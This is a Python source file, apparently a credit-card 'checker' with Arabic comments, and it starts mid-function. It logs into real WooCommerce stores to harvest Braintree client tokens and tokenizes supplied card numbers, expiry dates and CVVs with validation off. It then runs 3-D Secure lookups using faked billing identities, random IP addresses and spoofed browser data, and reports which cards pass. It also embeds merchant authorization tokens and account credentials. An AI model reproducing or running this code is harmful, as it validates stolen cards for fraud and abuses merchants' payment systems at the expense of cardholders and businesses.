	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=r.get("https://casabalo.com/mio-account/add-payment-method/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)











	headers={
'User-Agent': user,
}
	data = {
	'username': 'sxdxxrpp@hi2.in',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = r.post('https://casabalo.com/mio-account/add-payment-method/', headers=headers, data=data)



	headers={
'User-Agent': user,
}
 
	rr = r.get('https://casabalo.com/mio-account/add-payment-method/', headers=headers)


	aut=rr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
    f'https://api.braintreegateway.com/merchants/bhxnm4pmscyc69zw/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv













def otps5(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())
	



	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE0NjI2OTQsImp0aSI6Ijk1ZTdlNjkwLWVkYmMtNDA3ZS04ZDVkLWZlOTdiZmM4YzlmYyIsInN1YiI6IjhkNWhoNDhxcTVxMnA3NnAiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhkNWhoNDhxcTVxMnA3NnAiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkxFQ0hBTUVBVS1HQlAtVUsifX0.3rRjsmagV2Y50vH3Qv444I6603xg5a3nLULQK4ESGlpD4Uz6ePv9ql0N9Pee74K0Xn79bnWJrt_QGwv2lHLFWw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'abd3b4a4-3336-42de-a333-57643d3e112c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)





	r = requests.session()


	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)

	import requests

	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.lechameau.com',
    'referer': 'https://www.lechameau.com/checkout',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'amount': '220',
    'additionalInfo': {
        'acsWindowSize': '03',
    },
    'bin': '516361',
    'dfReferenceId': '0_1742ca94-2c4c-4ca3-a3ae-2f4528ad0ec3',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.92.2',
        'cardinalDeviceDataCollectionTimeElapsed': 1296,
        'issuerDeviceDataCollectionTimeElapsed': 6515,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE0NjI3MzEsImp0aSI6IjBjMzFhZDAxLTFjNjUtNDJlMS04MTc2LWQ5OTBkOWY3MjA2ZSIsInN1YiI6IjhkNWhoNDhxcTVxMnA3NnAiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhkNWhoNDhxcTVxMnA3NnAiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkxFQ0hBTUVBVS1HQlAtVUsifX0.mnumjFRMhglwLCPwSRFMJdnkYlHy4pKnnYdGsF0nklYPbMDAtjCbf6iTMfOJoegVR_JYqbHf7uwEmXSwgFyRwQ',
    'braintreeLibraryVersion': 'braintree/web/3.92.2',
    '_meta': {
        'merchantAppId': 'www.lechameau.com',
        'platform': 'web',
        'sdkVersion': '3.92.2',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '9abfc5cf-80d8-46fe-9102-73d7b3d006cf',
    },
}

	response = requests.post(
    f'https://api.braintreegateway.com/merchants/8d5hh48qq5q2p76p/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)

	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()
	

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv




